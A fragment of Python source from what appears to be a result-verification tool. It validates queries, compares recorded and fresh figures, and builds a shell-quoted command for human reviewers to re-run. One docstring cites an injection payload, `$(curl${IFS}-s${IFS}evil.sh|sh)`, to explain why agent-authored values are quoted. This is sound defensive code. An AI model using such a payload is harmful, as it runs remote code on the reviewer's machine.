    if name not in REGISTRY:
        raise ValueError(f"unknown query {name!r}; known: {', '.join(sorted(REGISTRY))}")
    # QueryCitation already refuses these at load. Checked again at the one door verify,
    # revalidation and the CLI all use, because a citation the reviewer cannot re-run must not
    # be green even where the query would ignore the character (`stance` keeps only its first).
    if reason := unsafe_reason(name, params):
        raise ValueError(reason)
    query = REGISTRY[name]
    missing = [p for p in query.required if not params.get(p)]
    if missing:
        raise ValueError(f"{name} needs {', '.join(missing)}")
    result = query.fn(root, **params)
    result.version = query.version
    result.export_date = export_date(name, root)
    return result


def matches(expected: Any, got: Any) -> bool:
    """Compare a recorded result to a fresh one.

    A None on either side matches only None: a miss is never a zero (see `_no_rows`).
    The query's return TYPE picks the comparison, so a new query must choose it deliberately:
    - an `int` is a count and compares exactly: '12.004' is not a count of 12;
    - a `float` is a dollar figure and must agree to the cent (TOLERANCE). Every numeric query
      today returns one. A count returned as `float(n)` would get the cent tolerance, and a
      ratio would need a comparison of its own;
    - anything else (a contributor's name) compares as trimmed, case-folded text.
    """
    if got is None or expected is None:
        return got == expected
    # Dispatch on what the query returned BEFORE parsing `expected`: a text result that looks
    # numeric ("100.00") must compare as text, or it would get the dollar tolerance.
    if isinstance(got, bool) or not isinstance(got, (int, float)):
        return str(expected).strip().casefold() == str(got).strip().casefold()
    try:
        e = float(str(expected).replace(",", "").lstrip("$"))
    except ValueError:
        return False
    if isinstance(got, int):
        return e == got
    return abs(e - got) < TOLERANCE


def human_command(name: str, params: dict[str, str], cache_root: str | None = None) -> str:
    """The command a reviewer copies and runs to check this themselves.

    `cache_root` is the root the figure was checked against (`QueryRun.cache_root`). Pass it
    whenever it is known: without `--cache`, `vg query` resolves its own root from `--data`,
    so a figure verified with `vg verify --cache X` printed a command reading a different
    database, or none — a green row its own command could not reproduce.

    The review page hands this string to a human to paste into a shell, and the name, keys
    and values are all agent-authored — so each is `shlex.quote`d as data. Quoting only values
    containing a space, and with repr, let `$(curl${IFS}-s${IFS}evil.sh|sh)` through bare:
    code execution on the reviewer's machine, delivered by the verification step.

    shlex.quote targets POSIX shells (sh, bash, zsh). fish reads `\\'` inside single quotes as
    an escaped quote, so a value ending in a backslash would unbalance its quoting; the review
    page says which shells the command is for.

    What quoting cannot neutralize (`unsafe_reason`) gets no command at all: "", which the
    review page renders as nothing to copy. QueryCitation refuses such a query at load, so
    this is the backstop for one built without validation.
    """
    if unsafe_reason(name, params):
        return ""
    cache = ""
    if cache_root:
        root = str(cache_root)
        if unprintable(root):
            # QueryRun refuses this at load; this is the backstop for one assigned after
            # validation. Same rule as a parameter: nothing to copy, not a command unlike its
            # display.
            return ""
        # A relative root starting with '-' would read as an option.
        cache = f" --cache {shlex.quote(root if not root.startswith('-') else './' + root)}"
    args = "".join(f" --param {shlex.quote(str(k))}={shlex.quote(str(v))}"
                   for k, v in params.items())
    return f"uv run vg query {shlex.quote(name)}{cache}{args}"
